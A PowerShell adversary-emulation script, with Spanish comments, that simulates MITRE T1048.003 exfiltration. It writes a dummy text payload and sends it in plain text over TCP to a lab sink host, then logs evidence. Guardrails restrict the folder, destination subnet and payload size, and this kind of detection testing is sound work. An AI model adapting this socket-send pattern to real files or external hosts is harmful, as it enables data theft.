# ATA077 - T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol (Windows)
# Manual (mismatch ART): las atomicas T1048.003 son Linux/ICMP; no hay una Windows de
# texto plano TCP que encaje. Se implementa texto plano por TcpClient al sink 9091.
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
$dir = Split-Path -Parent $MyInvocation.MyCommand.Path
if ($dir -notlike 'C:\lab-attack\ATA077*') { Write-Error 'GUARDARRAIL: carpeta no permitida'; exit 2 }
$ev = Join-Path $dir 'evidencias'
New-Item -ItemType Directory -Force -Path $ev | Out-Null
$sink = '192.168.65.1'
$port = 9091
if ($sink -notlike '192.168.65.*') { 'GUARDARRAIL: destino no permitido' | Out-File (Join-Path $ev 'efecto_local.txt') -Encoding ascii; exit 2 }
$plain = Join-Path $dir 'payload.txt'
1..20 | ForEach-Object { "TFG plain $_ " + ('D' * 64) } | Set-Content -Path $plain -Encoding ascii
$bytes = [IO.File]::ReadAllBytes($plain)
if ($bytes.Length -gt 67108864) { Write-Error 'GUARDARRAIL: payload > 64 MiB'; exit 2 }
$t0 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$client = New-Object System.Net.Sockets.TcpClient
$client.Connect($sink, $port)
$stream = $client.GetStream()
$stream.Write($bytes, 0, $bytes.Length)
$stream.Flush()
$client.Close()
$t1 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$sha = (Get-FileHash $plain -Algorithm SHA256).Hash.ToLower()
@(
    "ata=ATA077", "tecnica=T1048.003", "fuente=manual",
    "t0=$t0", "t1=$t1", "destino=$sink`:$port",
    "bytes=$($bytes.Length)", "sha256_plano=$sha"
) | Out-File -FilePath (Join-Path $ev 'efecto_local.txt') -Encoding ascii
exit 0
